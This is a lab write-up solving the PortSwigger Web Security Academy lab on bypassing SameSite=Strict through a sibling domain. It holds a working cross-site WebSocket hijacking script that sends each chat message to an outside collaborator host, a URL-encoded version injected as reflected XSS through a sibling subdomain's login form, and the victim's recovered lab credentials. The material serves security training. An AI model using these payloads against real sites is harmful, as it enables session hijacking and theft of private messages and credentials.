## Lab Description: SameSite Strict bypass via sibling domain

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e67ce03c-e03b-42a3-ac21-0882e2e65b81)

## Solution: 

Now we go to the lab website:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/aa545927-d075-41ef-b2c3-ebe0ee7bf86d)

Ok, note that there is a “Live Chat” on the right-hand side on the top. We click that.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/a66b9d17-7bcf-4fd9-9523-e2015aa8f632)

This is because our browser has stored our sessions, and every time we visit this /chat webpage, our browser sends the session value.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8eb3a9c4-3c46-4348-acae-397b959d430d)

- The SameSite=Strict property prevents the session from being sent if the web is visited through code (javascript) automatically. But if you are manually changing the address bar to visit the chat webpage, the session is allowed to be sent.
  And once you visit that /chat through code, your browser won’t send the session value and this value would be forgotten by your browser. This explains why refreshing does not see the chats.



  In the browser, go to the exploit server and use the following template to create a script for a CSWSH proof of concept:

```
<script>
    var ws = new WebSocket('wss://0aeb00f70330c49787095bd20001002f.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://q6xfzxmd09sge3zxbmgy9uwqnht8hy5n.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
Because this exploit visits the /chat webpage by code, thus no sessions would be sent, and you can not see the chat history at all! Since now the session is already forgotten by our browser, we need to re-enter some words in the /chat webpage and sent that again to create some chat history.

This web page contains a cross-site scripting (XSS) vulnerability. You can execute arbitrary javascript code in the Username field.

Store and view the exploit .

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b75a4e18-9656-4f2e-936b-be1b95b503d8)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f92a1076-24a3-4d30-8a3d-35e7b376a3ff)

URL encode the entire script.

```
%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%65%62%30%30%66%37%30%33%33%30%63%34%39%37%38%37%30%39%35%62%64%32%30%30%30%31%30%30%32%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%71%36%78%66%7a%78%6d%64%30%39%73%67%65%33%7a%78%62%6d%67%79%39%75%77%71%6e%68%74%38%68%79%35%6e%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
```

Go back to the exploit server and create a script that induces the viewer's browser to send the GET request you just tested, but use the URL-encoded CSWSH payload as the username parameter.

```
<script>
    document.location = "https://cms-0aeb00f70330c49787095bd20001002f.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%65%62%30%30%66%37%30%33%33%30%63%34%39%37%38%37%30%39%35%62%64%32%30%30%30%31%30%30%32%66%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%71%36%78%66%7a%78%6d%64%30%39%73%67%65%33%7a%78%62%6d%67%79%39%75%77%71%6e%68%74%38%68%79%35%6e%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=anything";
</script>
```

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/384b0169-b479-4fa3-a64e-96e0c00e7fa0)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/da477b8c-9f56-43e9-90e2-c1bc4e3417cd)

Store and Deliver the exploit .

In Burp, go back to the Collaborator tab and click Poll now. Observe that you've received a number of new interactions, which contain your entire chat history.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/9a4ab69a-755f-4bdc-9304-d74854c4f0e9)

Study the HTTP interactions and notice that these contain the victim's chat history.Find a message containing the victim's username and password.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/cfd74a7b-886a-423d-8a96-26a4e747cae6)

username: `carlos`, password: `ru5zqhkhulw1lx6tnh3k`

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/30cc66b2-efbf-4559-ab62-cc1a112bcc4c)


